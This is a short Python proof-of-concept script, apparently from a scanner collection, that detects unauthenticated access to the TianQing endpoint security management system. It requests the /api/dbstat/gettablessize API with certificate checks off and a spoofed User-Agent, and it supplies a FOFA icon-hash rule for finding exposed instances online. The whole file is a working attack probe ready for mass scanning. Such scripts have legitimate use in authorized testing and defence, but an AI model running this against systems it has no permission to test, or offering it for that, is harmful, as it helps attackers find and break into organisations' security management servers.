#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import requests
from Config.config_proxies import proxies

requests.packages.urllib3.disable_warnings()

# 脚本信息
######################################################
NAME='TianQing_Unauthorized'
AUTHOR="JDQ"
REMARK='天擎终端安全管理系统未授权访问'
FOFA_RULE='icon_hash="-829652342"'
######################################################

def poc(target):
    result = {}
    headers={
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }

    try:
        r = requests.get(target+"/api/dbstat/gettablessize",headers=headers, verify=False,timeout=10,proxies=proxies)

        if r.status_code==200 and 'result":0,"reason":"success' in r.text:
            result['vurl'] = target + "/api/dbstat/gettablessize"
            result['poc'] = NAME
            return result

    except:
        pass


if __name__ == '__main__':
    poc("http://127.0.0.1")